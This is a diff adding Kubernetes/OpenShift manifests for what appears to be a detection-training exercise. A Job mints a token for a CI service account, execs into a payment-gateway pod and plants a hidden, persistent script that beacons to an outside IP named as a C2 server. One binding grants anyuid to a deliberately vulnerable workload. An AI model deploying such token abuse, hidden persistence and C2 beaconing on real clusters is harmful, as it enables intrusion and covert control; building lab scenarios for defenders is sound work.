@@ -1,0 +1,112 @@
+# Records one audited exec from cicd-pipeline-runner-sa. The container
+# postStart hook keeps the process across restarts. This job is what
+# exercise 2 finds in the API audit log.
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: incident-bootstrap
+  namespace: payment-gateway-1
+  annotations:
+    argocd.argoproj.io/sync-wave: "1"
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  name: incident-bootstrap
+  namespace: payment-gateway-1
+  annotations:
+    argocd.argoproj.io/sync-wave: "1"
+rules:
+  - apiGroups: ["apps"]
+    resources: ["deployments"]
+    verbs: ["get"]
+  - apiGroups: [""]
+    resources: ["pods"]
+    verbs: ["get", "list", "watch"]
+  - apiGroups: [""]
+    resources: ["serviceaccounts"]
+    verbs: ["get"]
+  - apiGroups: [""]
+    resources: ["serviceaccounts/token"]
+    verbs: ["create"]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: incident-bootstrap
+  namespace: payment-gateway-1
+  annotations:
+    argocd.argoproj.io/sync-wave: "1"
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: Role
+  name: incident-bootstrap
+subjects:
+  - kind: ServiceAccount
+    name: incident-bootstrap
+    namespace: payment-gateway-1
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: vulnerable-workload-anyuid
+  namespace: vulnerable-workload-1
+  annotations:
+    argocd.argoproj.io/sync-wave: "1"
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: system:openshift:scc:anyuid
+subjects:
+  - kind: ServiceAccount
+    name: default
+    namespace: vulnerable-workload-1
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: payment-gateway-audit-exec
+  namespace: payment-gateway-1
+  annotations:
+    argocd.argoproj.io/sync-wave: "5"
+spec:
+  backoffLimit: 6
+  activeDeadlineSeconds: 600
+  template:
+    spec:
+      serviceAccountName: incident-bootstrap
+      restartPolicy: Never
+      containers:
+        - name: audit-exec
+          image: registry.redhat.io/openshift4/ose-cli:latest
+          command: ["/bin/bash", "-ec"]
+          args:
+            - |
+              oc rollout status deploy/payment-gateway -n payment-gateway-1 --timeout=300s
+              token="$(oc create token cicd-pipeline-runner-sa -n payment-gateway-1 --duration=15m)"
+              oc exec deploy/payment-gateway \
+                --namespace payment-gateway-1 \
+                --token "${token}" \
+                --container httpd \
+                -- sh -c "$(cat << 'EOS'
+              export C2_SERVER="185.199.108.153"
+              export CODENAME="SHADOW_PIVOT"
+              export ENV_MARKER="ACME_SECRET_KEY_EXFIL_TEST_9921"
+              mkdir -p /tmp/.hidden_toolkit
+              cat > /tmp/.hidden_toolkit/exfil.sh << "EOF"
+              #!/bin/sh
+              while true; do
+                curl --silent --max-time 2 --output /dev/null \
+                  --header "X-Agent-ID: SHADOW_PIVOT" \
+                  --header "X-Target-Namespace: payment-gateway" \
+                  "http://185.199.108.153/api/v1/beacon"
+                sleep 30
+              done
+              EOF
+              chmod +x /tmp/.hidden_toolkit/exfil.sh
+              if [ ! -s /tmp/.hidden_toolkit/exfil.pid ] || ! kill -0 "$(cat /tmp/.hidden_toolkit/exfil.pid)" 2>/dev/null; then
+                /tmp/.hidden_toolkit/exfil.sh > /dev/null 2>&1 &
+                echo $! > /tmp/.hidden_toolkit/exfil.pid
+              fi
+              EOS
+              )"
